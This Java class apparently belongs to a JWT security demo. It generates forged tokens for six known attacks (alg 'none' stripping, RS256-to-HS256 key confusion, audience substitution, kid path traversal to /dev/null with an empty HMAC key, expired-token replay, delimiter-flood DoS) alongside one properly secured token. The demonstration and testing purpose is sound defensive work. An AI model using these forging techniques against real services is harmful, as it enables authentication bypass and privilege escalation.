package com.demo.jwt.common;

import com.nimbusds.jose.JOSEObjectType;
import com.nimbusds.jose.JWSAlgorithm;
import com.nimbusds.jose.JWSHeader;
import com.nimbusds.jose.crypto.RSASSASigner;
import com.nimbusds.jwt.JWTClaimsSet;
import com.nimbusds.jwt.SignedJWT;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.util.Base64;
import java.util.Date;

/**
 * Generates test tokens demonstrating both attack vectors and secure best-practice tokens.
 */
public class AttackTokenGenerator {

    private static final Base64.Encoder B64_URL = Base64.getUrlEncoder().withoutPadding();

    /**
     * Attack 1: "alg": "none" signature stripping bypass.
     * Header declares alg "none", and signature segment is omitted or empty.
     */
    public static String createAlgNoneToken(String user, String role) {
        String header = "{\"alg\":\"none\",\"typ\":\"JWT\"}";
        String payload = String.format(
            "{\"sub\":\"%s\",\"role\":\"%s\",\"iss\":\"%s\",\"iat\":%d}",
            user, role, KeyManager.ISSUER, Instant.now().getEpochSecond()
        );
        String encHeader = B64_URL.encodeToString(header.getBytes(StandardCharsets.UTF_8));
        String encPayload = B64_URL.encodeToString(payload.getBytes(StandardCharsets.UTF_8));
        return encHeader + "." + encPayload + ".";
    }

    /**
     * Attack 2: Algorithm Confusion (RS256 to HS256).
     * Server expects RS256 with an RSA public key.
     * Attacker changes header to HS256 and signs using the publicly available RSA public key bytes
     * as the HMAC secret key.
     */
    public static String createAlgorithmConfusionToken(String user, String role, boolean usePem) {
        try {
            String header = "{\"alg\":\"HS256\",\"typ\":\"JWT\"}";
            String payload = String.format(
                "{\"sub\":\"%s\",\"role\":\"%s\",\"iss\":\"%s\",\"iat\":%d}",
                user, role, KeyManager.ISSUER, Instant.now().getEpochSecond()
            );

            String encHeader = B64_URL.encodeToString(header.getBytes(StandardCharsets.UTF_8));
            String encPayload = B64_URL.encodeToString(payload.getBytes(StandardCharsets.UTF_8));
            String signingInput = encHeader + "." + encPayload;

            byte[] hmacKey = usePem
                ? KeyManager.getPublicKeyPem().getBytes(StandardCharsets.UTF_8)
                : KeyManager.getPublicKeyDerBytes();

            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(new SecretKeySpec(hmacKey, "HmacSHA256"));
            byte[] signature = mac.doFinal(signingInput.getBytes(StandardCharsets.US_ASCII));

            return signingInput + "." + B64_URL.encodeToString(signature);
        } catch (Exception e) {
            throw new RuntimeException("Error generating algorithm confusion token", e);
        }
    }

    /**
     * Attack 3: Cross-Service Token Substitution / Confused Deputy.
     * A valid, legitimately signed RS256 token issued for a low-privilege agent or worker service.
     * When replayed against an Admin API that fails to check 'aud' and 'typ', the presenter gains admin access.
     */
    public static String createConfusedDeputyToken(String user) {
        try {
            JWSHeader header = new JWSHeader.Builder(JWSAlgorithm.RS256)
                .keyID(KeyManager.KEY_ID)
                .type(JOSEObjectType.JWT)
                .build();

            Instant now = Instant.now();
            JWTClaimsSet claims = new JWTClaimsSet.Builder()
                .subject(user)
                .issuer(KeyManager.ISSUER)
                .audience("low-privilege-worker-agent") // Targeted for worker agent, NOT admin!
                .claim("role", "worker")
                .issueTime(Date.from(now))
                .expirationTime(Date.from(now.plusSeconds(600)))
                .build();

            SignedJWT signedJWT = new SignedJWT(header, claims);
            signedJWT.sign(new RSASSASigner(KeyManager.getPrivateKey()));
            return signedJWT.serialize();
        } catch (Exception e) {
            throw new RuntimeException("Error generating confused deputy token", e);
        }
    }

    /**
     * Attack 4: Unverified 'kid' Header Injection (Path Traversal to /dev/null).
     * Attacker points 'kid' to /dev/null or an empty file.
     * The vulnerable file-based key resolver reads 0 bytes, so the HMAC secret is empty (0 bytes).
     * Attacker signs with HMAC-SHA256 using an empty secret.
     */
    public static String createKidPathTraversalToken(String user, String role) {
        try {
            // Header with path traversal in kid. In unsecured server, it reads empty file and verifies empty HMAC.
            // In secured server, it tries RS256 with malicious kid, which fails kid regex validation!
            String header = "{\"alg\":\"HS256\",\"typ\":\"at+jwt\",\"kid\":\"../../../../../../dev/null\"}";
            String payload = String.format(
                "{\"sub\":\"%s\",\"role\":\"%s\",\"iss\":\"%s\",\"aud\":\"secured-admin-api\",\"iat\":%d}",
                user, role, KeyManager.ISSUER, Instant.now().getEpochSecond()
            );

            String encHeader = B64_URL.encodeToString(header.getBytes(StandardCharsets.UTF_8));
            String encPayload = B64_URL.encodeToString(payload.getBytes(StandardCharsets.UTF_8));
            String signingInput = encHeader + "." + encPayload;

            // Empty secret key because /dev/null is empty (0 bytes)
            javax.crypto.SecretKey secretKey = new javax.crypto.SecretKey() {
                @Override public String getAlgorithm() { return "HmacSHA256"; }
                @Override public String getFormat() { return "RAW"; }
                @Override public byte[] getEncoded() { return new byte[0]; }
            };

            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(secretKey);
            byte[] signature = mac.doFinal(signingInput.getBytes(StandardCharsets.US_ASCII));

            return signingInput + "." + B64_URL.encodeToString(signature);
        } catch (Exception e) {
            throw new RuntimeException("Error generating kid traversal token", e);
        }
    }

    /**
     * Attack 5: Expired Token Replay Attack.
     * A token that expired 1 hour ago. Vulnerable servers that skip 'exp' validation will accept it.
     */
    public static String createExpiredToken(String user, String role) {
        try {
            JWSHeader header = new JWSHeader.Builder(JWSAlgorithm.RS256)
                .keyID(KeyManager.KEY_ID)
                .type(new JOSEObjectType("at+jwt"))
                .build();

            Instant now = Instant.now();
            JWTClaimsSet claims = new JWTClaimsSet.Builder()
                .subject(user)
                .issuer(KeyManager.ISSUER)
                .audience("secured-admin-api")
                .claim("role", role)
                .issueTime(Date.from(now.minusSeconds(7200)))
                .expirationTime(Date.from(now.minusSeconds(3600))) // Expired 1 hour ago
                .build();

            SignedJWT signedJWT = new SignedJWT(header, claims);
            signedJWT.sign(new RSASSASigner(KeyManager.getPrivateKey()));
            return signedJWT.serialize();
        } catch (Exception e) {
            throw new RuntimeException("Error generating expired token", e);
        }
    }

    /**
     * Attack 6: Delimiter Allocation Flood / Pre-parse DoS (CVE-2025-27144).
     * Floods Authorization header with excessive period characters.
     */
    public static String createDelimiterFloodToken(int dotCount) {
        StringBuilder sb = new StringBuilder("eyJhbGciOiJSUzI1NiJ9");
        for (int i = 0; i < dotCount; i++) {
            sb.append('.');
        }
        sb.append("eyJzdWIiOiJhdHRhY2tlciJ9");
        return sb.toString();
    }

    /**
     * Legitimate, RFC 8725 & RFC 9068 fully secured access token.
     * - Asymmetric RS256 signature
     * - Explicit typ: "at+jwt"
     * - Explicit aud: "secured-admin-api"
     * - Valid expiration (300 seconds)
     */
    public static String createValidSecuredToken(String user, String role) {
        try {
            JWSHeader header = new JWSHeader.Builder(JWSAlgorithm.RS256)
                .keyID(KeyManager.KEY_ID)
                .type(new JOSEObjectType("at+jwt")) // RFC 9068 explicit access token type
                .build();

            Instant now = Instant.now();
            JWTClaimsSet claims = new JWTClaimsSet.Builder()
                .subject(user)
                .issuer(KeyManager.ISSUER)
                .audience("secured-admin-api") // Explicit single audience
                .claim("role", role)
                .issueTime(Date.from(now))
                .expirationTime(Date.from(now.plusSeconds(300))) // 5-minute lifespan
                .build();

            SignedJWT signedJWT = new SignedJWT(header, claims);
            signedJWT.sign(new RSASSASigner(KeyManager.getPrivateKey()));
            return signedJWT.serialize();
        } catch (Exception e) {
            throw new RuntimeException("Error generating valid token", e);
        }
    }
}
